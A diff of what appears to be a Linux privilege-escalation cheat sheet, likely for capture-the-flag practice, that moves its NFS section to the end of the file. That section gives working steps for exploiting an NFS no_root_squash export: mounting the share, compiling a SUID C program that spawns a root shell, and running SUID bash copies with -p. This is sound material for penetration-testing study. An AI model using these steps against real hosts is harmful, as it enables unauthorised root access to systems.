@@ -78,81 +78,6 @@ Find and Read Flag: After gaining root privileges, locate the flag file to compl
 
 
 </details>
-<details>
-<summary>NFS</summary>
- <br> 
-
-NFS allows a host to share file system resources over a network. Access Control is based on the server's file system, and on the uid/gid provided by the connecting client.
-
-Root squashing maps files owned by root (uid 0) to a different ID (e.g. anonymous or nobody). If the "no_root_squash" option is enabled, files owned by root will not get mapped. This means that as long as you access the NFS share as a root (uid 0) user, you can write to the host file system as root.
-
-
-    $ cat /etc/exports
-
-    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
-
-On your local machine, check that the NFS share is accessible:
-
-
-    # showmount -e 10.0.0.1
-    Export list for 10.0.0.1:
-    /tmp *
-
-On your local machine, make a directory to mount the remote share, and then mount it:
-
-
-    # mkdir /tmp/mount
-    # mount -o rw,vers=2 10.0.0.1:/tmp /tmp/mount
-    # ls /tmp/mount
-    backup.tar.gz  useless
-
-Create an executable that calls /bin/bash with root level permissions in the mounted share and set the SUID bit:
-
-
-    int main() {
-        setresuid(0,0,0);
-        setresgid(0,0,0);
-        system("/bin/bash");
-    }
-
-
-    # gcc -o rootsh rootsh.c
-    # cp rootsh /tmp/mount
-    # chmod +s /tmp/mount/rootsh
-
-Now, back on the remote host, execute the executable to spawn a root shell:
-
-
-    $ /tmp/rootsh
-    #
-
-Alternatively, on the remote host, copy the /bin/bash or /bin/sh binary to the NFS directory:
-
-
-    $ cp /bin/bash /tmp
-
-On your local machine, after mounting the NFS share, create new copies of the files (or chown them to root) and set the SUID/SGUID bits:
-
-
-    # cp bash rootbash
-    # chmod +s rootbash
-
-    OR
-
-    # chown root:root bash
-    # chmod +s bash
-
-Now, back on the remote host, run the file. For bash / sh, use the -p command line option to preserve the SUID/SGID (otherwise shell will simply spawn as your own user).
-
-
-    $ /tmp/rootbash -p
-    #
-
-    OR
-
-    $ /tmp/bash -p
-    #
-</details>
 
 <details>
 <summary>SUDO</summary>
@@ -719,3 +644,80 @@ Linux Privilege Escalation
 * https://docs.ansible.com/ansible/latest/user_guide/become.html
 * https://payatu.com/guide-linux-privilege-escalation/
 * https://github.com/Arrexel/phpbash
+</details>
+
+<details>
+<summary>NFS</summary>
+ <br> 
+
+NFS allows a host to share file system resources over a network. Access Control is based on the server's file system, and on the uid/gid provided by the connecting client.
+
+Root squashing maps files owned by root (uid 0) to a different ID (e.g. anonymous or nobody). If the "no_root_squash" option is enabled, files owned by root will not get mapped. This means that as long as you access the NFS share as a root (uid 0) user, you can write to the host file system as root.
+
+
+    $ cat /etc/exports
+
+    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+
+On your local machine, check that the NFS share is accessible:
+
+
+    # showmount -e 10.0.0.1
+    Export list for 10.0.0.1:
+    /tmp *
+
+On your local machine, make a directory to mount the remote share, and then mount it:
+
+
+    # mkdir /tmp/mount
+    # mount -o rw,vers=2 10.0.0.1:/tmp /tmp/mount
+    # ls /tmp/mount
+    backup.tar.gz  useless
+
+Create an executable that calls /bin/bash with root level permissions in the mounted share and set the SUID bit:
+
+
+    int main() {
+        setresuid(0,0,0);
+        setresgid(0,0,0);
+        system("/bin/bash");
+    }
+
+
+    # gcc -o rootsh rootsh.c
+    # cp rootsh /tmp/mount
+    # chmod +s /tmp/mount/rootsh
+
+Now, back on the remote host, execute the executable to spawn a root shell:
+
+
+    $ /tmp/rootsh
+    #
+
+Alternatively, on the remote host, copy the /bin/bash or /bin/sh binary to the NFS directory:
+
+
+    $ cp /bin/bash /tmp
+
+On your local machine, after mounting the NFS share, create new copies of the files (or chown them to root) and set the SUID/SGUID bits:
+
+
+    # cp bash rootbash
+    # chmod +s rootbash
+
+    OR
+
+    # chown root:root bash
+    # chmod +s bash
+
+Now, back on the remote host, run the file. For bash / sh, use the -p command line option to preserve the SUID/SGID (otherwise shell will simply spawn as your own user).
+
+
+    $ /tmp/rootbash -p
+    #
+
+    OR
+
+    $ /tmp/bash -p
+    #
+</details>
